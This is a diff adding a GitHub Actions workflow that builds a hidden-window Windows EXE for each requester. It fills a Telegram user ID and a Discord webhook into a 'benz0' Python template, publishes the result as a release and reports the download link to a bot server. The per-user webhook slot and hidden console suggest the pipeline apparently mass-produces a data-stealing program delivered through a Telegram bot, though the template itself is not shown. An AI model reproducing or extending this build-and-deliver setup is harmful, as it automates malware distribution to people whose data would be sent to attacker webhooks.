@@ -1,0 +1,84 @@
+name: Build EXE
+
+on:
+  workflow_dispatch:
+    inputs:
+      user_id:
+        description: 'Telegram User ID'
+        required: true
+        type: string
+      discord_webhook:
+        description: 'Discord Webhook (optional)'
+        required: false
+        type: string
+      file_name:
+        description: 'Desired EXE file name (without .exe)'
+        required: false
+        type: string
+        default: 'benz0'
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
+
+      - name: Install PyInstaller
+        run: pip install pyinstaller
+
+      - name: Generate build script from template
+        shell: pwsh
+        run: |
+          $template = Get-Content "benz0_template.py" -Raw
+          $template = $template -replace 'USER_ID = "REPLACE_ME"', "USER_ID = `"${{ github.event.inputs.user_id }}`""
+          if ("${{ github.event.inputs.discord_webhook }}" -ne "") {
+            $template = $template -replace 'h00k = "https://discord.com/api/webhooks/..."', "h00k = `"${{ github.event.inputs.discord_webhook }}`""
+          }
+          $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
+          $template | Out-File -FilePath "${filename}.py" -Encoding utf8
+
+      - name: Build EXE
+        run: |
+          $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
+          pyinstaller --onefile --noconsole "${filename}.py"
+          $exe_name = "benz0_${{ github.event.inputs.user_id }}.exe"
+          if (Test-Path "dist\${filename}.exe") {
+            Rename-Item -Path "dist\${filename}.exe" -NewName $exe_name
+          } else {
+            Write-Error "EXE not found"
+            exit 1
+          }
+
+      - name: Create Release
+        id: create_release
+        uses: actions/create-release@v1
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          tag_name: build-${{ github.event.inputs.user_id }}
+          release_name: Build for user ${{ github.event.inputs.user_id }}
+          draft: false
+          prerelease: false
+
+      - name: Upload EXE to Release
+        uses: actions/upload-release-asset@v1
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          upload_url: ${{ steps.create_release.outputs.upload_url }}
+          asset_path: dist/benz0_${{ github.event.inputs.user_id }}.exe
+          asset_name: benz0_${{ github.event.inputs.user_id }}.exe
+          asset_content_type: application/octet-stream
+
+      - name: Notify bot about completion
+        run: |
+          $file_url = "https://github.com/JJ3RD0XXS/build-bot-exe/releases/download/build-${{ github.event.inputs.user_id }}/benz0_${{ github.event.inputs.user_id }}.exe"
+          curl -X POST https://JJ3RD0XXS.pythonanywhere.com/build_complete `
+            -H "Content-Type: application/json" `
+            -d "{\"user_id\": \"${{ github.event.inputs.user_id }}\", \"file_url\": \"$file_url\"}"
